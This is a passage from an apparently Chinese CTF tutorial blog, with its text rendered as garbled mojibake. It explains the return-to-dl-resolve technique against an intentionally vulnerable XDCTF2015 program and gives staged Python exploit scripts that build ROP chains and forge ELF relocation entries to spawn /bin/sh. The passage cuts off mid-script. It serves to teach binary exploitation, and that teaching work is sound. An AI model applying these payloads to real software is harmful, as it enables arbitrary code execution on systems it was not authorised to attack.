ˆç¼“å†²åŒºæº¢å‡ºæ¼æ´çš„ç¨‹åºï¼Œä»¥æ–¹ä¾¿åç»­æˆ‘ä»¬æ„é€ ROPé“¾ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">void vuln()</span><br><span class="line">&#123;</span><br><span class="line">char buf[100];</span><br><span class="line">setbuf(stdin,buf);</span><br><span class="line">read(0,buf,256); &#x2F;&#x2F; Buffer OverFlow</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char buf[100] &#x3D; &quot;Welcome to XDCTF2015~!\n&quot;;</span><br><span class="line"></span><br><span class="line">setbuf(stdout,buf);</span><br><span class="line">write(1,buf,strlen(buf));</span><br><span class="line"></span><br><span class="line">vuln();</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x01-å‡†å¤‡çŸ¥è¯†"><a href="#0x01-å‡†å¤‡çŸ¥è¯†" class="headerlink" title="0x01 å‡†å¤‡çŸ¥è¯†"></a>0x01 å‡†å¤‡çŸ¥è¯†</h4><h5 id="ç›¸å…³ç»“æ„"><a href="#ç›¸å…³ç»“æ„" class="headerlink" title="ç›¸å…³ç»“æ„"></a>ç›¸å…³ç»“æ„</h5><p>ELFå¯æ‰§è¡Œæ–‡ä»¶ç”±ELFå¤´éƒ¨ï¼Œç¨‹åºå¤´éƒ¨è¡¨å’Œå…¶å¯¹åº”çš„æ®µï¼ŒèŠ‚åŒºå¤´éƒ¨è¡¨å’Œå…¶å¯¹åº”çš„èŠ‚ç»„æˆã€‚å¦‚æœä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶å‚ä¸åŠ¨æ€é“¾æ¥ï¼Œå®ƒçš„ç¨‹åºå¤´éƒ¨è¡¨å°†åŒ…å«ç±»å‹ä¸º <code>PT_DYNAMIC</code> çš„æ®µï¼Œå®ƒåŒ…å«<code>.dynamic</code> èŠ‚åŒºã€‚ç»“æ„å¦‚å›¾ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        Elf32_Word  d_val;</span><br><span class="line">        Elf32_Addr  d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line"> &#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­Tagå¯¹åº”ç€æ¯ä¸ªèŠ‚åŒºã€‚æ¯”å¦‚<code>JMPREL</code>å¯¹åº”ç€<code>.rel.plt</code><br><a href="/images/Return-to-dl-resolve/1459431478784.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459431478784.png" alt="Alt text"></a></p><p>èŠ‚åŒºä¸­åŒ…å«ç›®æ ‡æ–‡ä»¶çš„æ‰€æœ‰ä¿¡æ¯ã€‚èŠ‚çš„ç»“æ„å¦‚å›¾ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">typedef struct&#123;</span><br><span class="line">    Elf32_Word sh_name;        &#x2F;&#x2F; èŠ‚åŒºå¤´éƒ¨å­—ç¬¦ä¸²è¡¨èŠ‚åŒºçš„ç´¢å¼•</span><br><span class="line">    Elf32_Word sh_type;        &#x2F;&#x2F; èŠ‚åŒºç±»å‹</span><br><span class="line">    Elf32_Word sh_flags;       &#x2F;&#x2F; èŠ‚åŒºæ ‡å¿—ï¼Œç”¨äºæè¿°å±æ€§</span><br><span class="line">    Elf32_Addr sh_addr;        &#x2F;&#x2F; èŠ‚åŒºçš„å†…å­˜æ˜ åƒ</span><br><span class="line">    Elf32_Off  sh_offset;      &#x2F;&#x2F; èŠ‚åŒºçš„æ–‡ä»¶åç§»</span><br><span class="line">    Elf32_Word sh_size;        &#x2F;&#x2F; èŠ‚åŒºçš„é•¿åº¦</span><br><span class="line">    Elf32_Word sh_link;        &#x2F;&#x2F; èŠ‚åŒºå¤´éƒ¨è¡¨ç´¢å¼•é“¾æ¥</span><br><span class="line">    Elf32_Word sh_info;        &#x2F;&#x2F; é™„åŠ ä¿¡æ¯</span><br><span class="line">    Elf32_Word sh_addralign;   &#x2F;&#x2F; èŠ‚åŒºå¯¹é½çº¦æŸ</span><br><span class="line">    Elf32_Word sh_entsize;     &#x2F;&#x2F; å›ºå®šå¤§å°çš„èŠ‚åŒºè¡¨é¡¹çš„é•¿åº¦</span><br><span class="line">&#125;Elf32_Shdr;</span><br></pre></td></tr></table></figure><p>å¦‚å›¾ï¼Œåˆ—å‡ºäº†è¯¥æ–‡ä»¶çš„28ä¸ªèŠ‚åŒºã€‚å…¶ä¸­ç±»å‹ä¸ºRELçš„èŠ‚åŒºåŒ…å«é‡å®šä½è¡¨é¡¹ã€‚<br><a href="/images/Return-to-dl-resolve/1459407202726.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459407202726.png" alt="Alt text"></a></p><p>ï¼ˆ1ï¼‰ å…¶ä¸­<code>.rel.plt</code>èŠ‚æ˜¯ç”¨äºå‡½æ•°é‡å®šä½ï¼Œ<code>.rel.dyn</code>èŠ‚æ˜¯ç”¨äºå˜é‡é‡å®šä½</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    Elf32_Addr r_offset;    &#x2F;&#x2F; å¯¹äºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ­¤å€¼ä¸ºè™šæ‹Ÿåœ°å€</span><br><span class="line">    Elf32_Word r_info;      &#x2F;&#x2F; ç¬¦å·è¡¨ç´¢å¼•</span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line">#define ELF32_R_SYM(i) ((i)&gt;&gt;8)</span><br><span class="line">#define ELF32_R_TYPE(i) ((unsigned char)(i))</span><br><span class="line">#define ELF32_R_INFO(s, t) (((s)&lt;&lt;8) + (unsigned char)(t))</span><br></pre></td></tr></table></figure><p>å¦‚å›¾ï¼Œåœ¨<code>.rel.plt</code>ä¸­åˆ—å‡ºäº†é“¾æ¥çš„Cåº“å‡½æ•°ï¼Œä»¥ä¸‹å‡å·²<code>write</code>å‡½æ•°ä¸ºä¾‹ï¼Œ<code>write</code>å‡½æ•°çš„<code>r_offset=0x804a010</code>,<code>r_info=0x507</code><br><a href="/images/Return-to-dl-resolve/1459407452175.png" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459407452175.png"></a></p><p>ï¼ˆ2ï¼‰ å…¶ä¸­<code>.got</code>èŠ‚ä¿å­˜å…¨å±€å˜é‡åç§»è¡¨ï¼Œ<code>.got.plt</code>èŠ‚å­˜å‚¨ç€å…¨å±€å‡½æ•°åç¦»è¡¨ã€‚<code>.got.plt</code>å¯¹åº”ç€<code>Elf32_Rel</code>ç»“æ„ä¸­<code>r_offset</code>çš„å€¼ã€‚å¦‚å›¾ï¼Œ<code>write</code>å‡½æ•°åœ¨GOTè¡¨ä¸­ä½äº<code>0x804a010</code><br><a href="/images/Return-to-dl-resolve/1459408892173.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459408892173.png" alt="Alt text"></a></p><p>ï¼ˆ3ï¼‰å…¶ä¸­<code>.dynsym</code>èŠ‚åŒºåŒ…å«äº†åŠ¨æ€é“¾æ¥ç¬¦å·è¡¨ã€‚å…¶ä¸­ï¼Œ<code>Elf32_Sym[num]</code>ä¸­çš„<code>num</code>å¯¹åº”ç€<code>ELF32_R_SYM(Elf32_Rel-&gt;r_info)</code>ã€‚æ ¹æ®å®šä¹‰ï¼Œ<code>ELF32_R_SYM(Elf32_Rel-&gt;r_info) = (Elf32_Rel-&gt;r_info)&gt;&gt;8</code>ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    st_name;   &#x2F;* Symbol name (string tbl index) *&#x2F;</span><br><span class="line">  Elf32_Addr    st_value;  &#x2F;* Symbol value *&#x2F;</span><br><span class="line">  Elf32_Word    st_size;   &#x2F;* Symbol size *&#x2F;</span><br><span class="line">  unsigned char st_info;   &#x2F;* Symbol type and binding *&#x2F;</span><br><span class="line">  unsigned char st_other;  &#x2F;* Symbol visibility under glibc&gt;&#x3D;2.2 *&#x2F;</span><br><span class="line">  Elf32_Section st_shndx;  &#x2F;* Section index *&#x2F;</span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure><p>å¦‚å›¾ï¼Œ<code>write</code>çš„ç´¢å¼•å€¼ä¸º<code>ELF32_R_SYM(0x507) = 0x507 &gt;&gt; 8 = 5</code>ã€‚è€Œ<code>Elf32_Sym[5]</code>å³ä¿å­˜ç€<code>write</code>çš„ç¬¦å·è¡¨ä¿¡æ¯ã€‚å¹¶ä¸”<code>ELF32_R_TYPE(0x507) = 7</code>,å¯¹åº”<code>R_386_JUMP_SLOT</code><br><a href="/images/Return-to-dl-resolve/1459409118762.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459409118762.png" alt="Alt text"></a></p><p>ï¼ˆ4ï¼‰å…¶ä¸­<code>.dynstr</code>èŠ‚åŒ…å«äº†åŠ¨æ€é“¾æ¥çš„å­—ç¬¦ä¸²ã€‚è¿™ä¸ªèŠ‚åŒºä»¥<code>\x00</code>ä½œä¸ºå¼€å§‹å’Œç»“å°¾ï¼Œä¸­é—´æ¯ä¸ªå­—ç¬¦ä¸²ä¹Ÿä»¥<code>\x00</code>é—´éš”ã€‚å¦‚å›¾ï¼Œ<code>Elf32_Sym[5]-&gt;st_name = 0x54</code>,æ‰€ä»¥<code>.dynstr</code>åŠ ä¸Š<code>0x54</code>çš„åç§»é‡ï¼Œå°±æ˜¯å­—ç¬¦ä¸²<code>write</code><br><a href="/images/Return-to-dl-resolve/1459414521835.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459414521835.png" alt="Alt text"></a></p><p>ï¼ˆ5ï¼‰å…¶ä¸­<code>.plt</code>èŠ‚æ˜¯è¿‡ç¨‹é“¾æ¥è¡¨ã€‚è¿‡ç¨‹é“¾æ¥è¡¨æŠŠä½ç½®ç‹¬ç«‹çš„å‡½æ•°è°ƒç”¨é‡å®šå‘åˆ°ç»å¯¹ä½ç½®ã€‚å¦‚å›¾ï¼Œå½“ç¨‹åºæ‰§è¡Œ<code>call write@plt</code>æ—¶ï¼Œå®é™…ä¼šè·³åˆ°<code>0x80483c0</code>å»æ‰§è¡Œã€‚<br><a href="/images/Return-to-dl-resolve/1459415839271.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459415839271.png" alt="Alt text"></a></p><h5 id="å»¶è¿Ÿç»‘å®š"><a href="#å»¶è¿Ÿç»‘å®š" class="headerlink" title="å»¶è¿Ÿç»‘å®š"></a>å»¶è¿Ÿç»‘å®š</h5><p>ç¨‹åºåœ¨æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œå¯èƒ½å¼•å…¥çš„æœ‰äº›Cåº“å‡½æ•°åˆ°ç»“æŸæ—¶éƒ½ä¸ä¼šæ‰§è¡Œã€‚æ‰€ä»¥ELFé‡‡ç”¨å»¶è¿Ÿç»‘å®šçš„æŠ€æœ¯ï¼Œåœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨Cåº“å‡½æ•°æ˜¯æ—¶æ‰ä¼šå»å¯»æ‰¾çœŸæ­£çš„ä½ç½®è¿›è¡Œç»‘å®šã€‚</p><p>å…·ä½“æ¥è¯´ï¼Œåœ¨å‰ä¸€éƒ¨åˆ†æˆ‘ä»¬å·²ç»çŸ¥é“ï¼Œå½“ç¨‹åºæ‰§è¡Œ<code>call write@plt</code>æ—¶ï¼Œå®é™…ä¼šè·³åˆ°<code>0x80483c0</code>å»æ‰§è¡Œã€‚è€Œ<code>0x80483c0</code>å¤„çš„æ±‡ç¼–ä»£ç ä»…ä»…ä¸‰è¡Œã€‚æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹è¿™ä¸‰è¡Œä»£ç åšäº†ä»€ä¹ˆã€‚<br><a href="/images/Return-to-dl-resolve/1459415839271.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459415839271.png" alt="Alt text"></a><br>ç¬¬ä¸€è¡Œï¼Œä¸Šä¸€éƒ¨åˆ†ä¹Ÿæåˆ°äº†<code>0x804a010</code>æ˜¯<code>write</code>çš„GOTè¡¨ä½ç½®ï¼Œå½“æˆ‘ä»¬ç¬¬ä¸€æ¬¡è°ƒç”¨<code>write</code>æ—¶ï¼Œå…¶å¯¹åº”çš„GOTè¡¨é‡Œå¹¶æ²¡æœ‰å­˜æ”¾<code>write</code>çš„çœŸå®åœ°å€ï¼Œè€Œæ˜¯ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚ç¬¬äºŒã€ä¸‰è¡Œï¼ŒæŠŠ<code>reloc_arg=0x20</code>ä½œä¸ºå‚æ•°æ¨å…¥æ ˆä¸­ï¼Œè·³åˆ°<code>0x8048370</code>ç»§ç»­æ‰§è¡Œã€‚<br><a href="/images/Return-to-dl-resolve/1459417176752.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459417176752.png" alt="Alt text"></a></p><p><code>0x8048370</code>å†æŠŠ<code>link_map = *(GOT+4)</code>ä½œä¸ºå‚æ•°æ¨å…¥æ ˆä¸­ï¼Œè€Œ<code>*(GOT+8)</code>ä¸­ä¿å­˜çš„æ˜¯<code>_dl_runtime_resolve</code>å‡½æ•°çš„åœ°å€ã€‚å› æ­¤ä»¥ä¸ŠæŒ‡ä»¤ç›¸å½“äºæ‰§è¡Œäº†<code>_dl_runtime_resolve(link_map, reloc_arg)</code>ï¼Œè¯¥å‡½æ•°ä¼šå®Œæˆç¬¦å·çš„è§£æï¼Œå³å°†çœŸå®çš„<code>write</code>å‡½æ•°åœ°å€å†™å…¥å…¶<code>GOT</code>æ¡ç›®ä¸­ï¼ŒéšåæŠŠæ§åˆ¶æƒäº¤ç»™<code>write</code>å‡½æ•°ã€‚<br><a href="/images/Return-to-dl-resolve/1459417932071.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459417932071.png" alt="Alt text"></a></p><p>å…¶ä¸­<code>_dl_runtime_resolve</code>æ˜¯åœ¨<code>glibc-2.22/sysdeps/i386/dl-trampoline.S</code>ä¸­ç”¨æ±‡ç¼–å®ç°çš„ã€‚<code>0xf7ff04fb</code>å¤„å³è°ƒç”¨<code>_dl_fixup</code>ï¼Œå¹¶ä¸”é€šè¿‡å¯„å­˜å™¨ä¼ å‚ã€‚<br><a href="/images/Return-to-dl-resolve/1459425491545.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459425491545.png" alt="Alt text"></a></p><p>å…¶ä¸­<code>_dl_fixup</code>æ˜¯åœ¨<code>glibc-2.22/elf/dl-runtime.c</code>å®ç°çš„ï¼Œæˆ‘ä»¬åªå…³æ³¨ä¸€äº›ä¸»è¦å‡½æ•°ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)</span><br></pre></td></tr></table></figure><p>é¦–å…ˆé€šè¿‡å‚æ•°<code>reloc_arg</code>è®¡ç®—é‡å®šä½å…¥å£ï¼Œè¿™é‡Œçš„<code>JMPREL</code>å³<code>.rel.plt</code>ï¼Œ<code>reloc_offset</code>å³<code>reloc_arg</code>ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const PLTREL *const reloc &#x3D; (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br></pre></td></tr></table></figure><p>ç„¶åé€šè¿‡<code>reloc-&gt;r_info</code>æ‰¾åˆ°<code>.dynsym</code>ä¸­å¯¹åº”çš„æ¡ç›®ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const ElfW(Sym) *sym &#x3D; &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜ä¼šæ£€æŸ¥<code>reloc-&gt;r_info</code>çš„æœ€ä½ä½æ˜¯ä¸æ˜¯<code>R_386_JUMP_SLOT=7</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert (ELFW(R_TYPE)(reloc-&gt;r_info) &#x3D;&#x3D; ELF_MACHINE_JMP_SLOT);</span><br></pre></td></tr></table></figure><p>æ¥ç€é€šè¿‡<code>strtab + sym-&gt;st_name</code>æ‰¾åˆ°ç¬¦å·è¡¨å­—ç¬¦ä¸²ï¼Œ<code>result</code>ä¸ºlibcåŸºåœ°å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result &#x3D; _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, NULL);</span><br></pre></td></tr></table></figure><p><code>value</code>ä¸ºlibcåŸºå€åŠ ä¸Šè¦è§£æå‡½æ•°çš„åç§»åœ°å€ï¼Œä¹Ÿå³å®é™…åœ°å€ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value &#x3D; DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : 0);</span><br></pre></td></tr></table></figure><p>æœ€åæŠŠ<code>value</code>å†™å…¥ç›¸åº”çš„GOTè¡¨æ¡ç›®ä¸­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br></pre></td></tr></table></figure><h4 id="æ¼æ´åˆ©ç”¨æ–¹å¼"><a href="#æ¼æ´åˆ©ç”¨æ–¹å¼" class="headerlink" title="æ¼æ´åˆ©ç”¨æ–¹å¼"></a>æ¼æ´åˆ©ç”¨æ–¹å¼</h4><ol><li>æ§åˆ¶EIPä¸ºPLT[0]çš„åœ°å€ï¼Œåªéœ€ä¼ é€’ä¸€ä¸ª<code>index_arg</code>å‚æ•°</li><li>æ§åˆ¶<code>index_arg</code>çš„å¤§å°ï¼Œä½¿<code>reloc</code>çš„ä½ç½®è½åœ¨å¯æ§åœ°å€å†…</li><li>ä¼ªé€ <code>reloc</code>çš„å†…å®¹ï¼Œä½¿<code>sym</code>è½åœ¨å¯æ§åœ°å€å†…</li><li>ä¼ªé€ <code>sym</code>çš„å†…å®¹ï¼Œä½¿<code>name</code>è½åœ¨å¯æ§åœ°å€å†…</li><li>ä¼ªé€ <code>name</code>ä¸ºä»»æ„åº“å‡½æ•°ï¼Œå¦‚<code>system</code></li></ol><h5 id="æ§åˆ¶EIP"><a href="#æ§åˆ¶EIP" class="headerlink" title="æ§åˆ¶EIP"></a>æ§åˆ¶EIP</h5><p>é¦–å…ˆç¡®è®¤ä¸€ä¸‹è¿›ç¨‹å½“å‰å¼€äº†å“ªäº›ä¿æŠ¤<br><a href="/images/Return-to-dl-resolve/1459398186541.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459398186541.png" alt="Alt text"></a></p><p>ç”±äºç¨‹åºå­˜åœ¨æ ˆç¼“å†²åŒºæ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨PEDAå¾ˆå¿«å®šä½è¦†å†™EIPçš„ä½ç½®ã€‚</p><p><a href="/images/Return-to-dl-resolve/1459398079809.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459398079809.png" alt="Alt text"></a></p><h5 id="stage1"><a href="#stage1" class="headerlink" title="stage1"></a>stage1</h5><p>æˆ‘ä»¬å…ˆå†™ä¸€ä¸ªROPé“¾ï¼Œç›´æ¥è¿”å›åˆ°<code>write@plt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from zio import *</span><br><span class="line"></span><br><span class="line">offset &#x3D; 112</span><br><span class="line"></span><br><span class="line">addr_plt_read  &#x3D; 0x08048390   # objdump -d -j.plt bof | grep &quot;read&quot;</span><br><span class="line">addr_plt_write &#x3D; 0x080483c0   # objdump -d -j.plt bof | grep &quot;write&quot;</span><br><span class="line"></span><br><span class="line">#.&#x2F;rp-lin-x86  --file&#x3D;bof --rop&#x3D;3 --unique &gt; gadgets.txt</span><br><span class="line">pppop_ret &#x3D; 0x0804856c</span><br><span class="line">pop_ebp_ret   &#x3D;  0x08048453</span><br><span class="line">leave_ret &#x3D; 0x08048481</span><br><span class="line"></span><br><span class="line">stack_size &#x3D; 0x800</span><br><span class="line">addr_bss   &#x3D; 0x0804a020   # readelf -S bof | grep &quot;.bss&quot;</span><br><span class="line">base_stage &#x3D; addr_bss + stack_size</span><br><span class="line"></span><br><span class="line">target &#x3D; &quot;.&#x2F;bof&quot;</span><br><span class="line">io   &#x3D; zio((target))</span><br><span class="line"></span><br><span class="line">io.read_until(&#39;Welcome to XDCTF2015~!\n&#39;)</span><br><span class="line"># io.gdb_hint([0x80484bd])</span><br><span class="line"></span><br><span class="line">buf1  &#x3D; &#39;A&#39; * offset</span><br><span class="line">buf1 +&#x3D; l32(addr_plt_read)</span><br><span class="line">buf1 +&#x3D; l32(pppop_ret)</span><br><span class="line">buf1 +&#x3D; l32(0)</span><br><span class="line">buf1 +&#x3D; l32(base_stage)</span><br><span class="line">buf1 +&#x3D; l32(100)</span><br><span class="line">buf1 +&#x3D; l32(pop_ebp_ret)</span><br><span class="line">buf1 +&#x3D; l32(base_stage)</span><br><span class="line">buf1 +&#x3D; l32(leave_ret)</span><br><span class="line">io.writeline(buf1)</span><br><span class="line"></span><br><span class="line">cmd &#x3D; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line"></span><br><span class="line">buf2 &#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(addr_plt_write)</span><br><span class="line">buf2 +&#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(1)</span><br><span class="line">buf2 +&#x3D; l32(base_stage+80)</span><br><span class="line">buf2 +&#x3D; l32(len(cmd))</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (80-len(buf2))</span><br><span class="line">buf2 +&#x3D; cmd + &#39;\x00&#39;</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (100-len(buf2))</span><br><span class="line">io.writeline(buf2)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure><p>æœ€åä¼šæŠŠæˆ‘ä»¬è¾“å…¥çš„<code>cmd</code>æ‰“å°å‡ºæ¥<br><a href="/images/Return-to-dl-resolve/1459438836360.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459438836360.png" alt="Alt text"></a></p><h5 id="stage2"><a href="#stage2" class="headerlink" title="stage2"></a>stage2</h5><p>è¿™æ¬¡æˆ‘ä»¬æ§åˆ¶EIPè¿”å›åˆ°<code>PLT0</code>ï¼Œè¦å¸¦ä¸Š<code>index_offset</code>ã€‚è¿™é‡Œæˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹<code>buf2</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">cmd &#x3D; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">addr_plt_start &#x3D; 0x8048370 # objdump -d -j.plt bof</span><br><span class="line">index_offset   &#x3D; 0x20</span><br><span class="line"></span><br><span class="line">buf2 &#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(addr_plt_start)</span><br><span class="line">buf2 +&#x3D; l32(index_offset)</span><br><span class="line">buf2 +&#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(1)</span><br><span class="line">buf2 +&#x3D; l32(base_stage+80)</span><br><span class="line">buf2 +&#x3D; l32(len(cmd))</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (80-len(buf2))</span><br><span class="line">buf2 +&#x3D; cmd + &#39;\x00&#39;</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (100-len(buf2))</span><br><span class="line">io.writeline(buf2)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure><p>åŒæ ·ä¼šæŠŠæˆ‘ä»¬è¾“å…¥çš„<code>cmd</code>æ‰“å°å‡ºæ¥<br><a href="/images/Return-to-dl-resolve/1459439191206.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459439191206.png" alt="Alt text"></a></p><h5 id="stage3"><a href="#stage3" class="headerlink" title="stage3"></a>stage3</h5><p>è¿™ä¸€æ¬¡æˆ‘ä»¬æ§åˆ¶<code>index_offset</code>ï¼Œä½¿å…¶æŒ‡å‘æˆ‘ä»¬ä¼ªé€ çš„<code>fake_reloc</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">cmd &#x3D; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">addr_plt_start &#x3D; 0x8048370 # objdump -d -j.plt bof</span><br><span class="line">addr_rel_plt   &#x3D; 0x8048318 # objdump -s -j.rel.plt a.out</span><br><span class="line">index_offset   &#x3D; (base_stage + 28) - addr_rel_plt</span><br><span class="line">addr_got_write &#x3D; 0x804a020</span><br><span class="line">r_info         &#x3D; 0x507</span><br><span class="line">fake_reloc     &#x3D; l32(addr_got_write) + l32(r_info)</span><br><span class="line"></span><br><span class="line">buf2 &#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(addr_plt_start)</span><br><span class="line">buf2 +&#x3D; l32(index_offset)</span><br><span class="line">buf2 +&#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(1)</span><br><span class="line">buf2 +&#x3D; l32(base_stage+80)</span><br><span class="line">buf2 +&#x3D; l32(len(cmd))</span><br><span class="line">buf2 +&#x3D; 